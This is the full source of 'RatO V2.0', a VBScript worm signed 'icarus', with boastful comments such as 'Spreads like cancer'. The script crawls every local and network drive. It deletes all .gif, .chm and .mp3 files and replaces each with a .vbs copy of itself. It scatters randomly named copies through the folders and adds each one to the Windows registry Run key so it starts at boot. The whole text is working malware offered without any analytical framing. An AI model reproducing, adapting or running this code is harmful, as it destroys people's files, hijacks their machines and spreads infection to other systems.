rem RatO V2.0
rem By icarus
rem The Revolution Has Begun...

dim fileSysObj,R,vbscOpy,ranName,eq,file,Fi
Set fileSysObj = CreateObject("Scripting.FileSystemObject")
set R = fileSysObj.OpenTextFile(WScript.ScriptFullname,1)
vbscOpy=R.ReadAll
Set FiOl = fileSysObj.GetFile(WScript.ScriptFullName)

lDrive()

sub iFile(fOlderspec)
On ErrOr Resume Next
dim f5,ext,ap,fc,s,a,fighl
set fighl = fileSysObj.GetFOlder(fOlderspec)
set fc = fighl.Files
fOr each f5 in fc
 ext=fileSysObj.GetExtensiOnName(f5.path)
 ext=lcase(ext)
 s=lcase(f5.name)
 if (ext = "gif") Or (ext = "chm") Or (ext="mp3") then
  fileSysObj.DeleteFile(fOlderspec&"\"&s)
  FiOl.COpy(fOlderspec&"\"&s&".vbs")
 end if
 if lcase(fOlderSpec) = "c:\windows\desktop" then
  fiOl.COpy("c:\windOws\desktOp\RatOII")
 end if
 if fOlderSpec <> OldfOlderspec then
  OldFOlderspec = fOlderspec
  randOmize timer
  a = int(rnd * 32766)+1
  FiOl.COpy(fOlderSpec&"\"&a&".vbs")
  rEdit "HKEY_LOCAL_MACHINE\SOftware\MicrOsOft\WindOws\CurrentVersiOn\Run\"&a, fOlderSpec&"\"&a&".vbs"
 end if
next
end sub

sub fOlderlist(fOlderspec)
On ErrOr Resume Next
dim fighl,f5,subf
set fighl = fileSysObj.GetFOlder(fOlderspec)
set subf = fighl.SubFOlders
fOr each f5 in subf
 iFile(f5.path)
 fOlderlist(f5.path)
next
end sub


sub rEdit(rKey,rValue)
Set registryEdit = CreateObject("WScript.Shell")
registryedit.RegWrite rKey,rValue
rem By icarus
end sub

sub lDrive
On ErrOr Resume Next
Dim dc,d,s
Set dc = fileSysObj.Drives
FOr Each d in dc
 If d.DriveType = 2 Or d.DriveType=3 Then
  fOlderlist(d.path&"\")
 end if
Next
lDrive = s
end sub

rem i'ts alive! -icarus
rem Spreads like cancer, eh?

